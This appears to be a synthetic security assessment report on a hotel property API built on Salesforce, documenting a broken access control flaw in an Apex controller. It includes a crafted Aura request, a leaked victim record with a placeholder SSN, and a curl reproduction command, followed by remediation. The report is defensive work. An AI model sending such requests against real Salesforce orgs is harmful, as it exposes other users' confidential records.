# Security Analysis Report
**System:** StayPro Property API (Salesforce-Integrated)
**Domain:** Hospitality / Hotel PMS
**Example ID:** SF-0080
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.1 | Functional pivot on `TaskController.getTask` — attacker pivots to read any hotel PMS Task record not belonging to their account |

---

## Finding 1 — BAC: Functional Pivot on Task Object (Pattern 2.1)

### Summary
The Apex controller `TaskController` on StayPro Property API (`b730a615.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Task object. Per §5.0 Pattern 2.1, the controller provides a functional pivot allowing a lower-privileged user to read records they should not access, enabling both horizontal and vertical access violations.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getTaskDetails(String taskId, ...)` while the Aura descriptor in §6.0 is `c.TaskController.getTask`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 2.1 — Functional pivot (vertical/horizontal) (BAC)
**Affected controller:** `c.TaskController.getTask`
**Affected endpoint:** `POST https://b730a615.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://b730a615.lightning.force.com/aura
Authorization: Bearer 00DB730A615!ARb730a615...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DB730A615!ARb730a615...

message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN",
"params":{"taskId":"001A615","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Task Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001A615", "Name": "Victim Task Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-55-3103"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DB730A615!ARb730a615..."
curl -s -X POST "https://b730a615.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN","params":{"taskId":"001A615","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-55-3103
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class TaskController { ... }`
2. `WHERE Id = :taskId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
